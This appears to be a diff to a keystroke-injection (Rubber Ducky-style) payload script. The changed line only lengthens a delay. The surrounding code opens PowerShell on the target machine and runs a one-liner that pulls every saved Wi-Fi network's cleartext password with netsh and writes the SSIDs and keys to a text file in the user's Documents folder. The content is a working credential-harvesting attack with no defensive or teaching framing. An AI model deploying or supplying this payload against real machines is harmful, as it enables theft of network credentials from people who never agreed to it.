@@ -5,7 +5,7 @@ GUI r
 DELAY 500
 STRING powershell
 ENTER
-DELAY 1000
+DELAY 4000
 STRING (netsh wlan show profiles) -match "(?i)All User" | ForEach-Object { $ssid = ($_ -split ':')[1].Trim(); $password = (netsh wlan show profile name=$ssid key=clear | Select-String "Key Content").Line -split ': ' | Select -Last 1; "`n======================================`nSSID: $ssid`nPassword: $password`n======================================" | Out-File -Append -FilePath $env:USERPROFILE\Documents\wifi-credentials.txt }
 ENTER
 DELAY 1000
